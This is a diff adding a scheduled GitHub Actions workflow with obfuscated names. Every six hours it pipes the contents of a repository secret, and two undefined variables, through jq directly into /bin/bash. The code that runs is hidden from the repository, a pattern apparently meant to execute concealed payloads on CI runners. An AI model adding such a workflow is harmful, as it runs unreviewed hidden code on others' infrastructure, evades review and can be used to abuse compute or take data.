@@ -1,0 +1,19 @@
+name: regulatehighjump
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: regulatehighjump
+        env:
+          yxfa93: ${{ secrets.yxfa93 }}
+        run: |
+          echo $yxfa93 | jq -r .box7 | /bin/bash
+          echo $xgx7 | jq -r .x66 | /bin/bash
+          echo $mbzp085 | jq -r .hix22896 | /bin/bash
+
